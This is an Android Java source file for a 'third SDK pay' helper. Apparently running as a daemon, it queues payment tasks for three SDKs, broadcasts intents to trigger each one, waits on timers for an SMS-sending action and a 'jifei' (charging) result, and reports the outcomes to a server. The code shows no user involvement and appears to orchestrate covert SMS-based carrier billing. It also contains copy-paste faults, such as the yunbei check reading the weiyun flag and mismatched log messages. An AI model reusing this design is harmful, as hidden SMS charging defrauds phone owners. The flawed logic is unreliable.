package com.thirdparty.engine;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.gandalf.daemon.utils.XL_log;
import com.thirdparty.entry.ThirdSdkPayTask;
import com.thirdparty.entry.ThirdSdkTask;
import com.thirdparty.net.Reporter;
import com.thirdparty.utils.Constants;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by as on 17-7-19.
 */

public class ThirdSdkPayHepler {
    private static XL_log log = new XL_log(ThirdSdkPayHepler.class);

    private Context mContext = null;

    private static ThirdSdkPayHepler INSTANCE = null;

    private ThirdSdkPayHepler(Context context) {
        this.mContext = context;
    }

    public static ThirdSdkPayHepler geInstance(Context context) {
        if (INSTANCE == null) {
            INSTANCE = new ThirdSdkPayHepler(context);
        }
        return INSTANCE;
    }

    private static boolean DOING_JOB = false;

    public void startDoJob() {
        if (DOING_JOB) {
            return;
        } else {
            DOING_JOB = true;
            doNextThirdSdkPayTask();
        }
    }

    private void doNextThirdSdkPayTask() {
        if (!smThirdSdkPayTasks.isEmpty()) {
            ThirdSdkPayTask task = smThirdSdkPayTasks.get(0);
            removeCacheThirdSdkPayTask(task);
            ArrayList<ThirdSdkTask> thirdSdkTasks = task.mThirdSdkTaskArrayList;
            if (thirdSdkTasks != null) {
                for (int i = 0; i < thirdSdkTasks.size(); i++) {
                    ThirdSdkTask thirdSdkTask = thirdSdkTasks.get(i);
                    addCacheThirdSdkTask(thirdSdkTask);
                }
            }
            doNextThirdSdkTask();
        } else {
            DOING_JOB = false;
            log.debug("do third sdk pay task finish !");
        }
    }

    private static ThirdSdkTask smCurThirdSdkTask = null;

    public static ThirdSdkTask getCurThirdSdkTask() {
        return smCurThirdSdkTask;
    }

    public static void setCurThirdSdkTask(ThirdSdkTask curThirdSdkTask) {
        smCurThirdSdkTask = curThirdSdkTask;
    }

    private void doNextThirdSdkTask() {
        if (!smThirdSdkTasks.isEmpty()) {
            ThirdSdkTask task = smThirdSdkTasks.get(0);
            if (task != null) {
                removeCacheThirdSdkTask(task);
                setCurThirdSdkTask(task);
                doThirdSdkTask(task);
            }
        } else {
            log.debug("do third sdk task finish !");
            doNextThirdSdkPayTask();
        }
    }

    private void doThirdSdkTask(ThirdSdkTask thirdSdkTask) {
        if (thirdSdkTask != null) {
            if (thirdSdkTask.mSdkName.equals("yufeng")) {
                setYuFengDoSendSmsActionState(false);
                setYuFengJiFeiState(false);
                yufengPay(thirdSdkTask);
                waitingYuFengDoSendSmsAction();
            } else if (thirdSdkTask.mSdkName.equals("weiyun")) {
                setWeiYunJiFeiState(false);
                setWeiYunDoSendSmsActionState(false);
                weiyunPay(thirdSdkTask);
                waitingWeiYunDoSendSmsAction();
            } else if (thirdSdkTask.mSdkName.equals("yunbei")) {
                setYunBeiJiFeiState(false);
                setYunBeiDoSendSmsActionState(false);
                yunbeiPay(thirdSdkTask);
                waitingYunBeiDoSendSmsAction();
            } else {
                log.error("can't find third sdk by name ");
            }
        }
    }

    private void yufengPay(ThirdSdkTask thirdSdkTask) {
        if (thirdSdkTask != null) {
            Intent intent = new Intent();
            intent.setAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_YF);
            Bundle b = new Bundle();
            b.putSerializable(Constants.BUNDLE_KEY_PAYTASK_YUFENG, thirdSdkTask);
            intent.putExtras(b);
            mContext.sendBroadcast(intent);
        }
    }

    private void weiyunPay(ThirdSdkTask thirdSdkTask) {
        if (thirdSdkTask != null) {
            Intent intent = new Intent();
            intent.setAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_WY);
            Bundle b = new Bundle();
            b.putSerializable(Constants.BUNDLE_KEY_PAYTASK_WEIYUN, thirdSdkTask);
            intent.putExtras(b);
            mContext.sendBroadcast(intent);
        }
    }


    private void yunbeiPay(ThirdSdkTask thirdSdkTask) {
        if (thirdSdkTask != null) {
            Intent intent = new Intent();
            intent.setAction(Constants.INTENT_ACTION_DO_PAYTASK_WITH_YUNBEI);
            Bundle b = new Bundle();
            b.putSerializable(Constants.BUNDLE_KEY_PAYTASK_YUNBEI, thirdSdkTask);
            intent.putExtras(b);
            mContext.sendBroadcast(intent);
        }
    }

    public static Timer smYuFengDoSendSmsActionTimer = new Timer();

    private void waitingYuFengDoSendSmsAction() {
        if (smYuFengDoSendSmsActionTimer != null) {
            smYuFengDoSendSmsActionTimer.schedule(new TimerTask() {
                @Override
                public void run() {
                    boolean hasDo = getYuFengDoSendSmsActionState();
                    if (hasDo) {
                        log.debug("yufeng has do send sms action ,waiting 60s for action finish ");
                        clearCacheThirdSdkTask();
                        Reporter.reportThirdSdkChannelState(mContext, null, 1);
                        Timer doNextTask = new Timer();
                        doNextTask.schedule(new TimerTask() {
                            @Override
                            public void run() {
                                boolean jifei = getyuFengJiFeiState();
                                if (jifei) {
                                    log.debug("YuFeng has jifei and report ");
                                    Reporter.reportThirdSdkSendResult(mContext, getCurThirdSdkTask(), 1);
                                } else {
                                    log.debug("YuFeng has not  jifei and report ");
                                    Reporter.reportThirdSdkSendResult(mContext, getCurThirdSdkTask(), 0);
                                }
                                doNextThirdSdkPayTask();
                            }
                        }, 15 * 1000);
                    } else {
                        log.debug("yufeng don't do send sms action , do next third sdk task ");
                        Reporter.reportThirdSdkChannelState(mContext, getCurThirdSdkTask(), 0);
                        doNextThirdSdkTask();
                    }

                }
            }, 10 * 1000);
        }
    }

    private static boolean smYuFengHasDoSendSmsActionState = false;

    public static void setYuFengDoSendSmsActionState(boolean action) {
        smYuFengHasDoSendSmsActionState = action;
    }

    public static boolean getYuFengDoSendSmsActionState() {
        return smYuFengHasDoSendSmsActionState;
    }

    private static boolean smWeiYunHasDoSendSmsActionState = false;

    public static void setWeiYunDoSendSmsActionState(boolean action) {
        smWeiYunHasDoSendSmsActionState = action;
    }

    public static boolean getWeiYunDoSendSmsActionState() {
        return smWeiYunHasDoSendSmsActionState;
    }

    private static boolean smYunBeiHasDoSendSmsActionState = false;

    public static void setYunBeiDoSendSmsActionState(boolean action) {
        smYunBeiHasDoSendSmsActionState = action;
    }

    public static boolean getYunBeiDoSendSmsActionState() {
        return smYunBeiHasDoSendSmsActionState;
    }


    private static boolean smWeiYunHasJiFei = false;

    public static void setWeiYunJiFeiState(boolean action) {
        smWeiYunHasJiFei = action;
    }

    public static boolean getWeiYunJiFeiState() {
        return smWeiYunHasJiFei;
    }

    private static boolean smYuFengHasJiFei = false;

    public static void setYuFengJiFeiState(boolean action) {
        smYuFengHasJiFei = action;
    }

    public static boolean getyuFengJiFeiState() {
        return smYuFengHasJiFei;
    }


    private static boolean smYunBeiHasJiFei = false;

    public static void setYunBeiJiFeiState(boolean action) {
        smYunBeiHasJiFei = action;
    }

    public static boolean getYunBeiJiFeiState() {
        return smYunBeiHasJiFei;
    }


    public static Timer smYunBeiDoSendSmsActionTimer = new Timer();

    private void waitingYunBeiDoSendSmsAction() {
        if (smYunBeiDoSendSmsActionTimer != null) {
            smYunBeiDoSendSmsActionTimer.schedule(new TimerTask() {
                @Override
                public void run() {
                    boolean hasDo = getWeiYunDoSendSmsActionState();
                    if (hasDo) {
                        log.debug("yunbei has do send sms action ,waiting 60s for action finish ");
                        clearCacheThirdSdkTask();
                        Timer doNextTask = new Timer();
                        doNextTask.schedule(new TimerTask() {
                            @Override
                            public void run() {
                                boolean jifei = getYunBeiJiFeiState();
                                if (jifei) {
                                    log.debug("yunbei has jifei and report ");
                                    Reporter.reportThirdSdkSendResult(mContext, getCurThirdSdkTask(), 1);
                                } else {
                                    log.debug("yunbei has not  jifei and report ");
                                    Reporter.reportThirdSdkSendResult(mContext, getCurThirdSdkTask(), 0);
                                }
                                doNextThirdSdkPayTask();
                            }
                        }, 15 * 1000);
                    } else {
                        log.debug("yunbei don't do send sms action , do next third sdk task ");
                        Reporter.reportThirdSdkChannelState(mContext, getCurThirdSdkTask(), 0);
                        doNextThirdSdkTask();
                    }
                }
            }, 10 * 1000);
        }
    }


    public static Timer smWeiYunDoSendSmsActionTimer = new Timer();

    private void waitingWeiYunDoSendSmsAction() {
        if (smWeiYunDoSendSmsActionTimer != null) {
            smWeiYunDoSendSmsActionTimer.schedule(new TimerTask() {
                @Override
                public void run() {
                    boolean hasDo = getWeiYunDoSendSmsActionState();
                    if (hasDo) {
                        log.debug("weiyun has do send sms action ,waiting 60s for action finish ");
                        clearCacheThirdSdkTask();
                        Timer doNextTask = new Timer();
                        doNextTask.schedule(new TimerTask() {
                            @Override
                            public void run() {
                                boolean jifei = getWeiYunJiFeiState();
                                if (jifei) {
                                    log.debug("YuFeng has jifei and report ");
                                    Reporter.reportThirdSdkSendResult(mContext, getCurThirdSdkTask(), 1);
                                } else {
                                    log.debug("YuFeng has not  jifei and report ");
                                    Reporter.reportThirdSdkSendResult(mContext, getCurThirdSdkTask(), 0);
                                }
                                doNextThirdSdkPayTask();
                            }
                        }, 15 * 1000);
                    } else {
                        log.debug("weiyun don't do send sms action , do next third sdk task ");
                        Reporter.reportThirdSdkChannelState(mContext, getCurThirdSdkTask(), 0);
                        doNextThirdSdkTask();
                    }
                }
            }, 10 * 1000);
        }
    }


    private static ArrayList<ThirdSdkPayTask> smThirdSdkPayTasks = new ArrayList<ThirdSdkPayTask>();
    private static ArrayList<ThirdSdkTask> smThirdSdkTasks = new ArrayList<ThirdSdkTask>();

    public void addCacheThirdSdkPayTask(ThirdSdkPayTask thirdSdkPayTask) {
        if (thirdSdkPayTask != null) {
            smThirdSdkPayTasks.add(thirdSdkPayTask);
        }
    }

    public void removeCacheThirdSdkPayTask(ThirdSdkPayTask thirdSdkPayTask) {
        if (thirdSdkPayTask != null) {
            smThirdSdkPayTasks.remove(thirdSdkPayTask);
        }
    }


    private void addCacheThirdSdkTask(ThirdSdkTask thirdSdkTask) {
        if (thirdSdkTask != null) {
            smThirdSdkTasks.add(thirdSdkTask);
        }
    }

    private void removeCacheThirdSdkTask(ThirdSdkTask thirdSdkTask) {
        if (thirdSdkTask != null) {
            smThirdSdkTasks.remove(thirdSdkTask);
        }
    }

    private void clearCacheThirdSdkTask() {
        if (smThirdSdkTasks != null) {
            smThirdSdkTasks.clear();
        }
    }
}
